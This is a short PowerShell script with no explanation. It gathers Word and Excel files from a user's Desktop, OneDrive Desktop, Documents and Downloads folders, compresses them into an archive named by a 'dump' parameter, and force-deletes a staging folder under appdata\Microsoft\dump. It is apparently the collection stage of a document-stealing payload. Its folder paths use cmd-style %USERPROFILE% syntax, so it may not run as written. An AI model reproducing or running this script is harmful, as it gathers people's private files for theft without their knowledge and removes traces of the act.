param (
    [Parameter()]
    [String]$dump_file_name
)

mkdir office_files ; Set-Location office_files
Get-ChildItem -Path "%USERPROFILE%\Desktop\*" -Include *.doc,*.docx,*.xls,*.xlsx -Recurse | Copy-Item -Destination .
Get-ChildItem -Path "%USERPROFILE%\OneDrive\Desktop\*" -Include *.doc,*.docx,*.xls,*.xlsx -Recurse | Copy-Item -Destination .
Get-ChildItem -Path "%userprofile%\Documents\*" -Include *.doc,*.docx,*.xls,*.xlsx -Recurse | Copy-Item -Destination .
Get-ChildItem -Path "%USERPROFILE%\Downloads\*" -Include *.doc,*.docx,*.xls,*.xlsx -Recurse | Copy-Item -Destination .

Set-Location ..
Compress-Archive -Path .\office_files -DestinationPath "$dump_file_name"
Remove-Item -Path "$env:appdata\Microsoft\dump\office_files" -recurse -Force